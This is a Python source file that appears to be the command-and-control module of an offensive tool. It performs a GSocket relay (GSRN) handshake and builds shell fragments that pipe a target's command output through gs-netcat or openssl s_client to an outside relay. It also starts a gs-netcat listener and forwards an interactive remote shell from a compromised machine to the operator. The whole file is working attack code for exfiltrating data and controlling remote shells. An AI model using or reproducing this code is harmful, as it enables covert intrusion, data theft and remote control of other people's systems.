"""
c2/methods.py — C2 relay and GSocket helpers.
Covers: GSocketCallbackReceiver, _gsrn_connect, _gsrn_token,
        start_gsocket_l1_listener, forward_gsocket_shell
"""
from __future__ import annotations

import hashlib
import select as _sel
import socket
import ssl
import subprocess
import sys
import threading
import time

from config import GSRN_HOST, GSRN_PORT, GSRN_RELAY_CANDIDATES, _GS_VER, _GS_LISTEN, _GS_CONN


def _log(msg: str, level: str = "info"):
    try:
        from ui.output import log as _log_fn
        _log_fn(msg, level)
    except Exception:
        print(f"[{level}] {msg}")


# ─── GSRN token / connect ─────────────────────────────────────────────────────

def _gsrn_token(secret: str) -> bytes:
    """Derive 20-byte session token from shared secret (SHA-1)."""
    return hashlib.sha1(secret.encode("utf-8")).digest()


def _gsrn_connect(secret: str, gs_type: int,
                  host: str = GSRN_HOST, port: int = GSRN_PORT) -> socket.socket | None:
    """
    Low-level GSRN handshake.
    Wire format: [version 1B][type 1B][token 20B][reserved 8B] → expect 0x00 ACK.
    """
    pkt = bytes([_GS_VER, gs_type]) + _gsrn_token(secret) + b"\x00" * 8
    try:
        try:
            socket.getaddrinfo(host, port)
        except socket.gaierror:
            _log(f"GSRN DNS failed for {host} — host not resolving", "err")
            return None
        raw = socket.create_connection((host, port), timeout=10)
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        conn = ctx.wrap_socket(raw, server_hostname=host)
        conn.sendall(pkt)
        ack = conn.recv(1)
        if ack and ack[0] == 0x00:
            return conn
        conn.close()
        _log(f"GSRN handshake rejected (ack={ack.hex() if ack else 'none'})", "warn")
        return None
    except OSError as e:
        _log(f"GSRN connect error [{host}:{port}]: {e}", "err")
        return None


# ─── GSocketCallbackReceiver ─────────────────────────────────────────────────

class GSocketCallbackReceiver:
    """
    Out-of-band command output capture via GSRN relay.
    Registers as LISTENER; target connects as CONNECTOR using gs-netcat
    and pipes command stdout through the relay to this script.

    No public IP required on the script side — only outbound access to relay.
    """

    def __init__(self, secret: str | None = None,
                 relay_host: str = GSRN_HOST, relay_port: int = GSRN_PORT,
                 relay_candidates: list[tuple[str, int]] | None = None):
        import secrets as _sec
        self.secret     = secret or _sec.token_hex(16)
        self.relay_host = relay_host
        self.relay_port = relay_port
        if relay_candidates is not None:
            self._candidates = relay_candidates
        else:
            user_pair = (relay_host, relay_port)
            self._candidates = [user_pair] + [c for c in GSRN_RELAY_CANDIDATES if c != user_pair]
        self.output: str | None = None
        self._event  = threading.Event()
        self._ready  = threading.Event()
        self._thread: threading.Thread | None = None
        self._conn:   socket.socket | None = None

    # ── public API ──────────────────────────────────────────────────────

    def start(self) -> bool:
        """Register with GSRN relay as listener. Returns True when relay-ready."""
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
        return self._ready.wait(15)

    def wait(self, timeout: float = 60.0) -> str | None:
        """Block until output arrives or timeout. Returns output string or None."""
        self._event.wait(timeout)
        return self.output

    def stop(self):
        """Close relay connection."""
        if self._conn:
            try:
                self._conn.close()
            except OSError:
                pass

    def target_cmd(self, user_cmd: str) -> str:
        """Shell fragment for target — requires gs-netcat binary on target."""
        extra = ""
        if self.relay_host != GSRN_HOST or self.relay_port != GSRN_PORT:
            extra = f" -r {self.relay_host} -p {self.relay_port}"
        return f"{user_cmd} | gs-netcat -q -s {self.secret}{extra}"

    def target_cmd_openssl(self, user_cmd: str) -> str:
        """Shell fragment using openssl s_client — no gs-netcat needed."""
        import base64 as _b64
        pkt  = bytes([_GS_VER, _GS_CONN]) + _gsrn_token(self.secret) + b"\x00" * 8
        b64  = _b64.b64encode(pkt).decode()
        return (
            f"({{"
            f"echo '{b64}' | base64 -d;"
            f" {user_cmd};"
            f"}} | openssl s_client -quiet"
            f" -connect {self.relay_host}:{self.relay_port}"
            f" 2>/dev/null)"
        )

    # ── internal ────────────────────────────────────────────────────────

    def _run(self):
        conn = None
        for rh, rp in self._candidates:
            _log(f"Trying GSRN relay {rh}:{rp} ...", "info")
            conn = _gsrn_connect(self.secret, _GS_LISTEN, rh, rp)
            if conn is not None:
                self.relay_host = rh
                self.relay_port = rp
                break

        if conn is None:
            _log(
                "All GSRN relays failed. Alternatives:\n"
                "  * HTTP callback: select 'http' mode\n"
                f"  * DNS check:     nslookup {GSRN_HOST}",
                "err",
            )
            self._ready.set()
            return

        self._conn = conn
        _log(
            f"GSRN listener ready  relay={self.relay_host}:{self.relay_port}"
            f"  secret={self.secret}",
            "ok",
        )
        self._ready.set()

        chunks: list[bytes] = []
        try:
            conn.settimeout(120)
            while True:
                chunk = conn.recv(8192)
                if not chunk:
                    break
                chunks.append(chunk)
        except (OSError, ssl.SSLError):
            pass
        finally:
            self.output = b"".join(chunks).decode("utf-8", errors="replace")
            self._event.set()
            try:
                conn.close()
            except Exception:
                pass


# ─── gs-netcat subprocess helpers ────────────────────────────────────────────

def start_gsocket_l1_listener(token: str):
    """Start gs-netcat -l -s TOKEN as a background subprocess (L1 side)."""
    try:
        return subprocess.Popen(
            ["gs-netcat", "-l", "-s", token],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
    except FileNotFoundError:
        return None


def forward_gsocket_shell(proc, token: str = "") -> None:
    """Forward shell from gs-netcat subprocess to user terminal (dumb tty)."""
    WARN_AFTER = 15
    sys.stdout.write("\n\033[1;33m[Waiting for L2 → L1 GSocket connection...]\033[0m\n")
    sys.stdout.flush()

    shell_active = False
    no_data_since = time.time()

    try:
        while proc.poll() is None:
            try:
                rfds, _, _ = _sel.select([proc.stdout, sys.stdin], [], [], 1)
            except (KeyboardInterrupt, ValueError):
                break

            if not rfds:
                if not shell_active and (time.time() - no_data_since) >= WARN_AFTER:
                    hint = f"  L1 token used: {token}" if token else ""
                    sys.stdout.write(
                        f"\n\033[1;31m[No data from L1 listener in {WARN_AFTER}s —"
                        f" verify L2 bridge is using the same L1 token.{hint}]\033[0m\n"
                    )
                    sys.stdout.flush()
                    no_data_since = time.time()
                continue

            for fd in rfds:
                if fd is proc.stdout:
                    data = fd.read1(4096)
                    if not data:
                        sys.stdout.write("\n\033[1;33m[L1 shell connection closed]\033[0m\n")
                        sys.stdout.flush()
                        return
                    if not shell_active:
                        shell_active = True
                        sys.stdout.write("\n\033[1;32m[L1 SHELL ACTIVE — Ctrl+C to detach]\033[0m\n")
                        sys.stdout.flush()
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
                    no_data_since = time.time()
                else:
                    if not shell_active:
                        continue
                    try:
                        cmd = sys.stdin.readline()
                    except (EOFError, KeyboardInterrupt):
                        return
                    if not cmd:
                        return
                    proc.stdin.write(cmd.encode())
                    proc.stdin.flush()
    except KeyboardInterrupt:
        pass
